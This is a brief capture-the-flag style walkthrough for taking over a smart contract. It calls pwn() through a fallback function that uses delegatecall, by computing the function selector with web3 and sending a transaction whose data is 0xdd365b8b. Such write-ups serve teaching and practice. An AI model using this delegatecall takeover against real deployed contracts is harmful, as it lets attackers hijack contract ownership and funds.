# In order to access `pwn()`, I need to use the fallback function that includes `delegatecall`. 

1. Get `pwn()`'s signature.
`web3.sha3("pwn()").slice(0,10)`
2. Send 4bytes of the signature to use the fallback function.
`contract.sendTransaction({data: '0xdd365b8b'})`